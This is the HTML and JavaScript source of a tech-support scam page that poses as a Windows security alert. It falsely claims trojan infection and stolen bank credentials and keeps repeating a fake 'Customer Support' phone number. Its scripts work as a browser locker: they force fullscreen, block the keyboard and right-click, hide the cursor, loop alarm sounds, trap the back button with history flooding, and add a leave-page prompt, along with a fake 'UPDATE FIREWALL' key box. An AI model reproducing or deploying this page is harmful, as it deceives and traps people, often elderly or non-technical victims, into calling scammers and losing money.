
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title _msttexthash="447083" _msthash="0">Security Require Action</title>
    <link rel="icon" href="windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png" type="image/x-icon">
    <link rel="stylesheet" href="../../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

    <script src="../../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
    <script src="../../cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>

            <link rel="stylesheet" href="pstyle.css">
            <style>
            body {
              background-image: url('website2.png');
              background-size: cover;
              background-repeat: no-repeat;
              background-attachment: fixed;
              margin: 0;
              font-family: 'Segoe UI',Verdana, sans-serif;
          }
          </style>
          <style>
.popup-container {
    background: url('Pop.png') no-repeat left top;
    background-size: cover;
    width: 630px;
    height: 320px;
    color: #111111;
    text-align: center;
    font-size: 16px;
    padding-top: 50px;
    border: 2px solid #005da4;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.76);
    z-index: 9999;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    opacity: 0;
    transition: transform 0.7s cubic-bezier(0.19, 1, 0.22, 1), opacity 0.7s linear;
}


.show-popup {
    transform: translateX(-50%) translateY(-50%);
    opacity: 1;
}

.button-container {
    position: absolute;
    bottom: 22px;
    right: 20px;
}

.updatebutton {
    cursor: pointer;
    color: #ffffff;
    background: rgba(10, 117, 205, 0.069);
    border: 2px solid #e7e7e7;
    border-radius: 5px;
    padding: 6px 57px;
    font-size: 14px;
    margin-left: 5px;
}
.updatebutton:hover {
    background: #098902;
    color: #fff;
}

.ignorebutton {
    cursor: pointer;
    color: #ffffff;
    background: rgba(10, 117, 205, 0.069);
    border: 2px solid #e7e7e7;
    border-radius: 5px;
    padding: 6px 57px;
    font-size: 14px;
    margin-left: 5px;
}

.ignorebutton:hover {
    background: #a91e1e;
    color: #fff;
}
          </style>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-YBKBE81CHB"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-YBKBE81CHB');
</script>

</head>
<body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
    <!-- "Top Telecast" square box at the top -->
    <div class="telecasted-top">
        <span> </span>
    </div>


    <!-- "Error Telecast" running text at the bottom -->

    <div class="error-telecast11" id="">
        <span style="font-size: 24px;"><strong>Customer Support:</strong>  +1-833-211-1001 </span>
    </div>

    <div class="error-telecast" id="errorTelecast">
        <span style="font-size: 16px;"><strong>Warning:</strong> Critical System Operations Ongoing. Do Not Turn Off Your Device. It may cause system failure or critical error. If you are unable to unlock, you can contact customer support for assistance and take immediate action to prevent damage.</span>
    </div>

    <!-- Windows-style pop-up container (Warning popup) -->
    <div class="popup-container" onclick="changeBackground(); closeFirstPopup();" id="firstPopup">
        <!-- Popup Content -->
        <div class="popup-content">
            <!-- Button Container -->
            <div class="button-container">
              <button class="close-button" onclick="closeFirstPopup()"><strong>X</strong></button>
            <a href="#"><button class="updatebutton" onclick="closeFirstPopup()"><strong>Update</strong></button></a>
            <a href="#"><button class="ignorebutton" onclick="closeFirstPopup()"><strong>Ignore</strong></button></a>
            </div>
        </div>
    </div>

    <!-- Disclaimer Pop-up -->
    <div class="disclaimer-popup" id="disclaimerPopup">
        <p>
          <img src="windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png" style="width: 18px; vertical-align: middle;" alt="">
          <strong style="vertical-align: middle;font-size: 16px;"> If you're having trouble activating security, Get in touch with  Windows Customer Support +1-833-211-1001</strong></p>
    </div>

    <!-- Blue description popup -->
    <div class="blue-description-popup" id="blueDescriptionPopup">
      <p>
        <img src="wall.png" style="width: 24px; vertical-align: middle;" alt="">
        <strong style="vertical-align: middle;">Alert!</strong>
    </p>
            <p><br></p>
        <p>Your system has reported us that it has been infected by trojen or spyware. following data has been compromised</p>
        <ul class="list-unstyled ml-1">
          <li>Email security</li>
          <li>Bank credentianl</li>
          <li>IP address has been conflict</li>
        </ul>

        <p>The Windows firewall has detected unwanted run dll32 files that have the potential to steal your data, online access, passwords, and personal identity</p>
        <p>You need to take action immediately to prevent and fix security protection</p>
        <p>Call customer support to report this threat and unlock the device.</p>
        <p>Always take security protocol seriously.</p>
        <p style="text-align: center;"><span style="font-size: 20px;"><strong>Customer Support: +1-833-211-1001</strong></span></p>
    </div>

    <!-- Second Windows-style pop-up container (System failure popup) -->
    <div class="popup-container2" id="secondPopup" style="display: none;">
        <div class="popup-header">
            <h3><img src="windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png" style="width: 33px; vertical-align: middle;">
              <span style="vertical-align: middle;"> System Failure</span></h3>
        </div>

        <div class="popup-content">
          <strong><p style="color: red;"><span style="font-size: 16px;">ⓘ Error updating software: #09292w099738H08</span></p></strong>
          <strong><p style="color: red;"><span style="font-size: 16px;">Avoid turning off the computer. It might damage the hard drive or cause a system crash.</span></p></strong>
          <strong><p><span style="font-size: 16px;">Some features have been disabled for security reasons. Please get in touch with  Windows Customer Support.</span></p>
          </strong>

          <strong><p><span style="font-size: 20px; text-align:center !important;">  Customer Support: +1-833-211-1001 </span></p> </strong>

                  <a href="#">
                        <span class="popup-buttons" onclick="hideSecondPopup()1" style="font-size: 18px;"><strong>OK</strong></span>
                      </a>
                </div>
                </div>


    <!-- Customer Support Notification -->
    <div class="support-notification" id="supportNotification" style="text-align: left;">
          <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">

      <div id="main">


        <button class="chatbot-toggler">
          <span style="font-size: 16px;"><img src="windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png" style="width: 18px; vertical-align: middle;" alt="">
            <strong style="vertical-align: middle;"> Help Center <span class="material-symbols-outlined">mode_comment</span></strong></span>
          <span class="material-symbols-outlined">close</span>
      </button>

        <div class="mobile-screen" id="mobileScreen">
            <div class="camera-space">
                <span class="speaker"></span>
            </div>

            <div class="chatbot">
                <div class="suggestionBox">
                    <div class="suggestion" onclick="handleSuggestion('I can’t access my account. Can you help?')">I can’t access my account. Can you help?</div>
                    <div class="suggestion" onclick="handleSuggestion('I need technical assistance.')">I need technical assistance.</div>
                    <div class="suggestion" onclick="handleSuggestion('How do I install updates on my system?')">How do I install updates on my system?</div>
                </div>
                <ul class="chatbox">
                    <li class="chat incoming">
                        <span class="material-symbols-outlined">smart_toy</span>
                        <p>Hi there 👋,<br> How can I help you today</p>
                    </li>
                    <li class="chat outgoing">
                    </li>
                </ul>
                <div class="chatbot-input">
                    <textarea placeholder="Enter your message . . ." required=""></textarea>
                    <button type="submit">
                        <span id="send-btn" class="material-symbols-outlined">send</span>
                    </button>
                </div>
            </div>
        </div>
    </div>
  </div>

    <!-- Popup for asking key and code -->
    <div class="key-code-popup" id="keyCodePopup">
      <h2 style="color: rgb(255, 255, 255);">
      <img src="wall.png" style="width: 24px; vertical-align: middle;" alt="">
      <strong style="vertical-align: middle;"> UPDATE FIREWALL</strong>
    </h2>

            <input class="key-code-input" type="password" placeholder="Enter key">
                          <!-- Toast Notification -->
    <div class="toast-notification" id="toastNotification">
      Entera a valid key
  </div>
        <button class="key-code-submit" onclick="submitKeyCode()"> UPDATE</button>

    </div>

    <!-- Loading animation -->
    <div class="loading-animation" id="loadingAnimation">
        <div class="loading-spinner"></div>
    </div>


    <script src="pscript.js"></script>

    <script type="text/javascript" src="main.js"></script>
    <script type="text/javascript" src="event.js"></script>


    <script>
      $(function() {
        var a = 0,
          b = setInterval(function() {
            a += 10;
            $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% Complete");
            100 <= a && clearInterval(b)
          }, 100)
      });
    </script>
    <script>
      (function(a) {
        a.fn.countTo = function(b) {
          b = b || {};
          return a(this).each(function() {
            function d(a) {
              a = c.formatter.call(k, a, c);
              h.html(a)
            }
            var c = a.extend({}, a.fn.countTo.defaults, {
                from: a(this).data("from"),
                to: a(this).data("to"),
                speed: a(this).data("speed"),
                refreshInterval: a(this).data("refresh-interval"),
                decimals: a(this).data("decimals")
              }, b),
              l = Math.ceil(c.speed / c.refreshInterval),
              n = (c.to - c.from) / l,
              k = this,
              h = a(this),
              m = 0,
              f = c.from,
              g = h.data("countTo") || {};
            h.data("countTo", g);
            g.interval && clearInterval(g.interval);
            g.interval = setInterval(function() {
              f += n;
              m++;
              d(f);
              "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
              m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
            }, c.refreshInterval);
            d(f)
          })
        };
        a.fn.countTo.defaults = {
          from: 0,
          to: 0,
          speed: 100,
          refreshInterval: 100,
          decimals: 0,
          formatter: function(a, d) {
            return a.toFixed(d.decimals)
          },
          onUpdate: null,
          onComplete: null
        }
      })(jQuery);
      jQuery(function(a) {
        a(".count-number").data("countToOptions", {
          formatter: function(a, d) {
            return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
          }
        });
        a(".timer").each(function(b) {
          var d = a(this);
          b = a.extend({}, b || {}, d.data("countToOptions") || {});
          d.countTo(b)
        })
      });
    </script>

    <script>
      addEventListener("click", function() {
    var el = document.documentElement
      , rfs =
             el.requestFullScreen
          || el.webkitRequestFullScreen
          || el.mozRequestFullScreen
    ;
    rfs.call(el);
    });

    </script>

    <script>
      var modal = document.getElementById("myModal"),
        btn = document.getElementById("myBtn"),
        span = document.getElementsByClassName("close")[0];
      span.onclick = function() {
        modal.style.display = "none"
      };
      window.onclick = function(a) {
        a.target == modal && (modal.style.display = "none")
      };
    </script>
    <script>
      setInterval(function() {
        document.getElementById("pridez").play()
      }, 500);
    </script>

    <script>
      setInterval(function() {
        document.getElementById("pridez1").play()
      }, 500);
    </script>
    <script>
      var e = 1;
      setInterval(function() {
        1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
      }, 1E3);
    </script>
    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#welcomeDiv").show()
        })
      });
    </script>
    <script>
      $(document).ready(function() {
        $(".pro_box").delay(900).fadeIn(800);
        $(".black").delay(1E3).fadeIn(800);
        $(".pro_box2").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3500).fadeIn(800);
        $("#pop_up_new").delay(4E3).fadeIn(800);
        $("#poptxt").delay(4E3).fadeIn(800)
      });
    </script>
    <script>
      $(document).ready(function() {
        $("#mycanvas").click(function() {
          $("#poptxt").show()
        })
      });
      $(document).ready(function() {
        $("#cross").click(function() {
          $("#poptxt").show()
        })
      });
    </script>
    <script>
      $(document).ready(function() {
        $("body").mouseover(function() {
          $("#poptxt").show()
        })
      });
    </script>
    <script>
      var isNS = "Netscape" == navigator.appName ? 1 : 0;
      "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

      function mischandler() {
        return !1
      }

      function mousehandler(a) {
        a = isNS ? a : event;
        a = isNS ? a.which : a.button;
        if (2 == a || 3 == a) return !1
      }
      document.oncontextmenu = mischandler;
      document.onmousedown = mousehandler;
      document.onmouseup = mousehandler;
    </script>

<script>
  navigator.keyboard.lock();
  document.onkeydown = function (e) {
  return false;
  }
  </script>

    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">

      <audio autoplay="" id="pridez">
        <source src="audio1.wav" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="pridez1">
        <source src="b00p.mp3" type="audio/mpeg">
      </audio>


          <link href="5f205bb74a5eb_v.css" type="text/css" rel="stylesheet">
          <!--<script src=".index_files/jquery.min.js" type="text/javascript"></script>-->
          <!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
          <script type="text/javascript">
              //backbutton
              !(function () {
                  var t;
                  try {
                      for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
                      onpopstate = function (t) {
                          t.state && location.replace("#");
                      };
                  } catch (o) {}
              })();
          </script>

          <link rel="stylesheet" href="froala_style.min.css">
          <link href="5f205bb63ccd2_v.css" rel="stylesheet">
          <link id="anstrexCustomLink" rel="stylesheet" type="text/css" href="5f205bc497791_v.css">
        <script type="text/javascript">
  function myFunction() {
    return "Write something clever here...";
  }
  </script>
  <script>

    $(document).ready(function() {
        $(".arow-div").delay(1000).fadeIn(500);
    });
    </script>
    <script type="text/javascript">
        $(document).ready(function(){
      $(".delayedPopupWindow").click(function(){
        $('.delayedPopupWindow').hide('fast');
      });
    });
    </script>
    <script type="text/javascript">
        $(document).ready(function(){
      $(".black").click(function(){
        $('.delayedPopupWindow').hide('fast');
      });
    });
    </script>
    <script type="text/javascript">
        $(document).ready(function(){
      $("#win1").click(function(){
        $('.delayedPopupWindow').hide('fast');
      });
    });
    </script>
    <script type="text/javascript">
        $(document).ready(function(){
      $("#win2").click(function(){
        $('.delayedPopupWindow').hide('fast');
      });
    });
    </script>
    <script type="text/javascript">
        $(document).ready(function(){
      $("alert_popup").click(function(){
        $('.delayedPopupWindow').hide('fast');
      });
    });
    </script>

    <script type="text/javascript">
     function addEvent(obj, evt, fn) {
        if (obj.addEventListener) {
            obj.addEventListener(evt, fn, false);
        } else if (obj.attachEvent) {
            obj.attachEvent("on" + evt, fn);
        }
    }

    addEvent(document, 'mouseout', function(evt) {
        if (evt.toElement == null && evt.relatedTarget == null) {
            $('.lightbox').slideDown();
        };
    });

    $('a.close').click(function() {
        $('.lightbox').slideUp();
    });
  </script>




</body>
</html>
